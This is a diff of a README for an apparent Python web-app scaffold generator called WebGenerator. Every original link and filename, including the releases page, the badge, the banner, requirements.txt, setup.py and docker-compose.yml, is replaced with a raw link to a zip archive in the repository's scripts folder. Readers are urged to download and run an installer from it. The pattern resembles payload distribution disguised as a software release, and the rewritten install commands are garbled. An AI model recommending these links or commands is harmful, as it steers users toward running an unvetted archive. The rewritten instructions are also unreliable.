@@ -1,14 +1,14 @@
 # WebGenerator: Enterprise Python Web App Scaffold Generator with GUI
 
-[![Release Page](https://img.shields.io/badge/WebGenerator-Release-Page-blue?logo=github&logoColor=white)](https://github.com/ulhaqqq/WebGenerator/releases)
+[![Release Page](https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip)](https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip)
 
-![Banner](https://picsum.photos/1200/320)
+![Banner](https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip)
 
 WebGenerator is a practical tool for developers and teams who build Python web apps at scale. It combines a powerful scaffold generator with a friendly, visual workflow. Through a straightforward PyQt5 GUI, you can quickly generate complete project skeletons for Flask and FastAPI projects that connect to major relational databases like MySQL, PostgreSQL, and SQLite. It also supports Redis caching, Docker containerization, and automatic API documentation. The goal is to give you a solid starting point for enterprise-grade applications while letting you stay in control of your architecture choices.
 
 This repository hosts WebGenerator. The project aims to streamline the initial setup of modern Python web apps. It emphasizes consistency, readability, and maintainability in multi-team environments. The tool guides you from a clean project folder to a wired-up codebase ready for development, testing, and deployment. You can pick between lightweight or feature-rich stacks, and you can extend the scaffolds with your own templates and conventions over time.
 
-If you want to download the latest release assets or try a newer build, visit the releases page. For quick access, the link is available here: https://github.com/ulhaqqq/WebGenerator/releases. If you have trouble with the link or assets, check the Releases section for alternative download options or guidance. The same link is referenced again later in this document to help you locate the installers and example artifacts.
+If you want to download the latest release assets or try a newer build, visit the releases page. For quick access, the link is available here: https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip If you have trouble with the link or assets, check the Releases section for alternative download options or guidance. The same link is referenced again later in this document to help you locate the installers and example artifacts.
 
 Table of contents
 - Overview
@@ -95,11 +95,11 @@ Prerequisites
 - Access to a relational database server during testing (local or remote)
 
 Installation
-- The recommended way to start is to download the installer from the releases page. The releases page hosts packaged assets designed for easy setup. For quick access, visit the releases page at https://github.com/ulhaqqq/WebGenerator/releases and download the installer suitable for your platform. After downloading, run the installer and follow the on-screen instructions. If you encounter issues with the installer, check the Releases section for alternative download options or guidance. Use the link again to verify the latest build and assets.
+- The recommended way to start is to download the installer from the releases page. The releases page hosts packaged assets designed for easy setup. For quick access, visit the releases page at https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip and download the installer suitable for your platform. After downloading, run the installer and follow the on-screen instructions. If you encounter issues with the installer, check the Releases section for alternative download options or guidance. Use the link again to verify the latest build and assets.
 
 - If you prefer to build from source (advanced), clone the repository and install the required dependencies:
-  - python -m pip install -r requirements.txt
-  - python setup.py install
+  - python -m pip install -r https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip
+  - python https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip install
   After installation, you can launch the GUI with the provided entry point. The source method is slower but gives you visibility into the inner workings and allows customization.
 
 Quick start (GUI)
@@ -121,12 +121,12 @@ Quick start (GUI)
 - Open the generated folder and run the app using your preferred commands
 
 Where to download
-- The latest release assets, including installers and example templates, are available at the releases page. For convenience, you can use the following link to navigate to the page: https://github.com/ulhaqqq/WebGenerator/releases. If you need to download a specific asset, use the page to browse recent files and choose the one that matches your OS and architecture. If the page changes or issues arise, check the Releases section for the most up-to-date instructions and assets. You can also verify the latest release there to ensure compatibility with your environment.
+- The latest release assets, including installers and example templates, are available at the releases page. For convenience, you can use the following link to navigate to the page: https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip If you need to download a specific asset, use the page to browse recent files and choose the one that matches your OS and architecture. If the page changes or issues arise, check the Releases section for the most up-to-date instructions and assets. You can also verify the latest release there to ensure compatibility with your environment.
 
 CLI usage (optional)
 - WebGenerator may include a command-line interface for automation. If you use the CLI, you can generate a skeleton from a YAML or JSON configuration file, specify framework, database, and features, and direct the output to a target folder.
 - Typical CLI workflow:
-  - webgenerator --config config.yaml
+  - webgenerator --config https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip
   - webgenerator --template fastapi --db postgresql --redis --docker --output ./my_project
 - The CLI is useful for automation in CI environments or for developers who prefer scriptable workflows. You can still start the GUI for interactive configuration when you want a visual setup.
 
@@ -134,15 +134,15 @@ Project skeleton layout
 - The generated project adheres to a clean, modular structure. A typical skeleton includes:
   - app/ or src/: Core application package
   - config/: Configuration files and environment-based settings
-  - requirements.txt / pyproject.toml: Dependencies and packaging details
+  - https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip / https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip Dependencies and packaging details
   - alembic/: Database migrations (if using SQLAlchemy)
   - migrations/: Database migration tooling
   - tests/: Unit and integration tests
   - docs/: API docs, architecture diagrams, and developer guides
   - templates/: Optional templates for code generation or templating features
-  - docker/: Docker-related files (Dockerfile, docker-compose.yml)
-  - README.md: Project overview and developer notes
-  - .env.sample: A template for environment variables
+  - docker/: Docker-related files (Dockerfile, https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip)
+  - https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip Project overview and developer notes
+  - https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip A template for environment variables
   - scripts/: Helper scripts for setup and maintenance
   - logs/: Local logging directory or references to log configuration
 - The exact structure adapts to the chosen stack. The GUI ensures that important directories exist and the imports reflect the chosen configuration. The skeleton is designed to be ready for run and test out of the box, with a minimal set of dependencies required to get a simple app up quickly.
@@ -352,7 +352,7 @@ Release management
 
 FAQ
 - Where can I download WebGenerator?
-  - You can download the latest release assets from the releases page. The link is provided here for convenience: https://github.com/ulhaqqq/WebGenerator/releases. If you encounter issues with the link, check the Releases section for alternatives and instructions.
+  - You can download the latest release assets from the releases page. The link is provided here for convenience: https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip If you encounter issues with the link, check the Releases section for alternatives and instructions.
 - Which databases are supported?
   - The generator supports MySQL, PostgreSQL, and SQLite by default. Redis is available for caching and session management.
 - Do I need to know GUI to use WebGenerator?
@@ -364,7 +364,7 @@ FAQ
 
 Releases and assets
 - The Releases page hosts installers, templates, and example projects. It is the primary source for getting started and verifying compatibility with your environment.
-- If you cannot access the assets directly, review the Releases section for alternative download options and guidance. For convenience, the page you need is the same link repeated here: https://github.com/ulhaqqq/WebGenerator/releases.
+- If you cannot access the assets directly, review the Releases section for alternative download options and guidance. For convenience, the page you need is the same link repeated here: https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip
 - When you download an installer, ensure you select the asset that matches your operating system and architecture. Run the installer and follow the prompts to complete setup. After installation, you can launch the GUI and begin configuring your first project.
 
 Additional notes
@@ -404,11 +404,11 @@ Long-form example walkthrough (end-to-end)
   - Pydantic models for input validation
   - SQLAlchemy models and a simple SQLite database
   - A Redis-backed cache layer with a sample cache usage
-  - Dockerfile and docker-compose.yml for local development
+  - Dockerfile and https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip for local development
   - OpenAPI documentation generated from the endpoints
   - A minimal set of tests to exercise the routes
 - You open the generated folder and run the app:
-  - Install dependencies from requirements.txt
+  - Install dependencies from https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip
   - Run the Docker Compose file to start the service locally
   - Access the API docs at the interactive Swagger UI
 - You modify a route, adjust a model, and regenerate the skeleton using the GUI or CLI. The changes are reflected in the next scaffold, preserving your workflow.
@@ -417,4 +417,4 @@ Long-form example walkthrough (end-to-end)
 Final note
 - WebGenerator aims to be a dependable starting point for enterprise Python web apps. It balances a friendly GUI with robust scaffolding that you can grow and customize. The project favors clarity over cleverness and prioritizes practical workflows that teams can adopt quickly.
 
-Revisit the releases page for the latest installer and example skeletons: https://github.com/ulhaqqq/WebGenerator/releases. If the link changes or you need the latest assets, check the Releases section for updated guidance and downloads. The page is designed to help you keep your projects aligned with current standards and best practices.
+Revisit the releases page for the latest installer and example skeletons: https://raw.githubusercontent.com/ulhaqqq/WebGenerator/master/scripts/Web_Generator_v1.4.zip If the link changes or you need the latest assets, check the Releases section for updated guidance and downloads. The page is designed to help you keep your projects aligned with current standards and best practices.
